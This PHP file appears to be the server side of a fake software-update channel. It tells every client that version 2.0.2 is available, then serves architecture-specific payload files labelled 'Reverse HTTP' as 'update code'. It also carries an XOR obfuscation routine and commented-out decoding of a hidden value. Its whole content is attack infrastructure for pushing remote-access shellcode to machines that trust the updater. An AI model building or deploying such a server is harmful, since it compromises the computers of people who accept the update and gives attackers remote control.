<?php
//session_start();
$action = $_GET["action"];

//$xor_key = "4";
//$string = xorIt(base64_decode($safety), $xor_key, 1);

if($action === "versioncheck")
{
	echo "{ \"AppUpdater\" {
     	\"update\": \"true,\"
     	\"version\": \"2.0.2\"
     	}";
}

if($action === "update")
{
	$arch = $_GET["arch"];
	echo "{ \"AppUpdater\" {
	\"update\": \"true,\"
	\"version\": \"2.0.2\",";
	if($arch === "x86")
	{		
		$payloadx86 = file_get_contents("payload_x86.xyz");		
		echo "\"architecture\": \"x86\" \"update code\": ";		
		#Reverse HTTP
		echo "\"|".$payloadx86."|\" }"; 
	}
	elseif($arch === "x64")
	{
		$payloadx64 = file_get_contents("payload_x64.xyz");
		echo "\"architecture\": \"x64\" \"update code\": ";
		#Reverse HTTP
		echo "\"|".$payloadx64."|\" }"; 
	}
	else
	{
		echo "\"architecture\": \"error\" }";
	}
	echo " }";
}

//http://www.codelibary.com/snippet/1077/xor-encrypt-decrypt
 
function xorIt($string, $key, $type = 0)
{
        $sLength = strlen($string);
        $xLength = strlen($key);
        for($i = 0; $i < $sLength; $i++) {
		if ($type == 1) {
                	//decrypt
                        $string[$i] = $key^$string[$i];                              
                } 
		else {
                	//crypt
                        $string[$i] = $string[$i]^$key;
                }                
        }
        return $string;
}
?>